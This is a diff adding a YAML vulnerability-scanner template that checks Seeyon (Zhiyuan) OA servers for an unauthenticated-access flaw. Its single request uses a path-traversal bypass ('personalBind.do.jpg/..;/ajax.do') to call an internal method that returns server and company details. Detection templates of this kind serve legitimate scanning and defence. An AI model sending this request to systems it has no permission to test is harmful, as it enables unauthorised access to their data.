@@ -1,0 +1,27 @@
+id: zhiyuan-oa-unauthorized
+name: Zhiyuan Oa Unauthorized
+severity: low
+confidence: tentative
+description: Zhiyuan Oa is exposed.
+reference: https://buaq.net/go-53721.html
+tags:
+- seeyon
+- unauth
+- zhiyuan
+- misconfig
+- vuln
+requests:
+- method: GET
+  path: /seeyon/personalBind.do.jpg/..;/ajax.do?method=ajaxAction&managerName=mMOneProfileManager&managerMethod=getOAProfile
+  matchers:
+  - type: body
+    words:
+    - serverIdentifier
+    - companyName
+  - type: header
+    words:
+    - application/json
+  - type: status
+    status:
+    - 200
+  condition: and
